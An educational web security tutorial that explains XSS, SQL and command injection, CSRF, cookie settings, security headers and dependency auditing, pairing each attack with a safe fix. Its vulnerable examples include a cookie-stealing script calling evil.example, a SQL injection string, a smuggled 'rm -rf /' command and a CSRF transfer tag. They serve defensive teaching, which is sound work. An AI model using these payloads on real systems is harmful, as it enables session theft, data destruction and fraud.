Security

Web application security

A web application receives data from people you do not control and shows it to people you do not control either. Web security is, above all, deciding which data is trustworthy and treating the rest as a threat. Here you will see the most common attacks, how they are exploited and how to prevent them in your own code.

The mindset: do not trust the input

Every piece of data that comes from outside — forms, URL parameters, headers, cookies, uploaded files, API responses — is suspicious by default. Even if the interface validates on the client side, anyone can send requests by hand with curl, so the only validation that counts is the server's.

The classic rule: «validate on input, escape on output». Check that the data has the expected shape when it arrives, and turn it into harmless text right before using it, according to the context where it will end up.

XSS: code injection in the browser

Cross-Site Scripting happens when user data ends up interpreted as JavaScript or HTML by someone else's browser. The attacker runs code on your site's origin: it can read the DOM, steal cookies and impersonate actions.

Example vulnerable — a comment printed without escaping:

# The attacker writes this as a "comment"
  <script>fetch('https://evil.example/?c=' + document.cookie)</script>

  // Rendered WITHOUT escaping: the script runs for every visitor
  document.innerHTML = 'Comment: ' + comment;   // danger!

Safe version: treat the data as text, never as HTML:

// textContent does not interpret tags: the <script> stays as visible text
  const paragraph = document.createElement('p');
  paragraph.textContent = 'Comment: ' + comment;  // safe
  • Reflected: the malicious data travels in the request itself (URL, form).
  • Stored: it is saved (database) and attacks every visitor.
  • DOM-based: client code manipulates the DOM with untrusted data.

Prefer APIs that assign text (textContent, createTextNode) over those that assign HTML (innerHTML, insertAdjacentHTML). innerHTML only with content you generated, never with user data.

SQL and command injection

If you concatenate user input inside an SQL statement or a system command, the user can change what you execute. It is one of the oldest attacks and still frequent.

Vulnerable: the user types '' OR 1=1 -- as the password:

const q = "SELECT * FROM users WHERE name='" + name + "' AND pass='" + pass + "'";

Safe: the database distinguishes code from data for you:

// Prepared statements: parameters are data, never SQL code
  const rows = await db.query(
    'SELECT id FROM users WHERE name = ? AND pass = ?',
    [name, pass]
  );
# COMMAND INJECTION: never interpolate input into a shell
  # Danger: input = "file.txt; rm -rf /"
  exec('cat ' + input);

  # Safe: passed as a separate argument, so the ';' is not interpreted
  execFile('cat', [input]);  // or validate the exact expected shape

CSRF: forged requests with your session

Cross-Site Request Forgery takes advantage of the browser automatically sending cookies (session ones included) to your server, even when the request was triggered by another site. If you are authenticated, a malicious page can «click on your behalf». 

<!-- On the attacker's page: your browser loads it and submits the form with your cookies -->
  <img src="https://bank.example/transfer?amount=1000&to=attacker">

Common defences:

  • Anti-CSRF token: the server delivers a random value that the form sends back; the attacker cannot read it from another origin.
  • SameSite cookies: prevent the cookie from being sent in cross-site requests.
  • No GET with side effects: actions that change data must require POST/PUT/DELETE.
  • Check the Origin or Referer header on critical changes.

Validate, sanitise and escape

They are three different operations, not synonyms:

Operation What it does Example
ValidateReject what does not match the expected formatEmail with @, numeric age, integer id
SanitiseClean the data by removing what is dangerousAllow limited HTML in an editor
EscapeEncode the data for the output context< → &lt; in HTML; \' in SQL without prepared statements

Allowlist is better than blocklist: define what is allowed («only letters and numbers») instead of trying to enumerate everything dangerous. 

// Validate on the server side, not only on the client
  const id = Number(req.params.id);
  if (!Number.isInteger(id) || id <= 0) {
    return res.status(400).json({ error: 'invalid id' });
  }

Session cookies

The session cookie is the key to the user's account; configure it so that it is hard to steal or to be used by other sites: 

Set-Cookie: session=abc123;
  Secure;          // travels over HTTPS only
  HttpOnly;        // JavaScript cannot read it (mitigates theft via XSS)
  SameSite=Lax;    // not sent in ordinary cross-site requests
  Path=/;
  Max-Age=3600;

Besides: rotate the identifier on login, expire inactive sessions and invalidate the session on the server on logout (deleting the cookie is not enough).

HttpOnly does not prevent XSS, but it takes away the attacker's most valuable target. Passwords and sensitive data go in the body of protected requests, never in URLs or in localStorage reachable by any script on the page.

Security headers

The server instructs the browser through response headers. They are a second layer that limits the damage if something fails in your code:

Header What it is for
Content-Security-PolicyAllowlist of script/style origins; the strongest defence against XSS.
X-Content-Type-Options: nosniffStops the browser from «guessing» MIME types and executing what it should not.
frame-ancestors (CSP) or X-Frame-OptionsPrevents your site from being embedded in another (clickjacking).
Referrer-PolicyControls how much of the origin URL travels to other sites.
Strict-Transport-SecurityForces HTTPS always (HSTS) for that domain.
Permissions-PolicyDisables browser APIs you do not use (camera, geolocation…).

Example of a CSP policy for a self-contained site that loads no external resources:

Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  frame-ancestors 'none';

Start in report mode (Content-Security-Policy-Report-Only) to see what your policy would block before activating it, because a badly written CSP breaks legitimate scripts.

Dependencies and secrets

Your code is only part of the application: half the risk is in the libraries you use and in the secrets that run it.

  • Keep a lockfile (package-lock.json) and audit it from time to time.
  • Update regularly: known vulnerabilities are patched, not ignored.
  • Fewer dependencies = smaller attack surface.
# Audit Node dependencies (reports known vulnerabilities)
  npm audit
  npm audit fix

  # Equivalent check in Python
  pip-audit

Secrets (API keys, DB credentials) live outside the code: in environment variables or a secret manager. The repository is public forever once published; rotate any credential that has appeared in it.

# .gitignore before the first commit
  .env
  *.pem
  # look in history if any slipped through: git log -S 'API_KEY'

Checking your own site

Simple exercises you can do today, against your own site:

# 1) Which security headers do I return?
  curl -I https://yourdomain.example/
  curl -sI https://yourdomain.example/ | grep -iE 'content-security|strict|x-frame|referrer'

  # 2) Do I accept requests from other origins where I should not? (check CORS)
  curl -sI -H 'Origin: https://other-site.example' https://yourdomain.example/api/data \
    | grep -i 'access-control-allow-origin'

  # 3) Does my API accept absurd input without rejecting it?
  curl -s "https://yourdomain.example/api/search?q=%3Cscript%3E" | grep -i script

  # 4) Which cookies does my login set?
  curl -sI -X POST https://yourdomain.example/login | grep -i set-cookie

Test only on your own projects or with explicit authorisation. These checks complement Cryptography · Verification commands and Network security · Verifying TLS certificates.

Best practices

  • Always escape on output and use prepared statements on every SQL query.
  • Validate on the server even if the client also validates.
  • Generic errors to the user, details only in the logs; do not leak paths or versions.
  • Minimise permissions: session cookies carry HttpOnly and SameSite.
  • Add and review security headers; not all need external tools.
  • Update dependencies and rotate credentials; a leaked key expires the day it leaks.
  • Log failures: what is not measured is not protected.
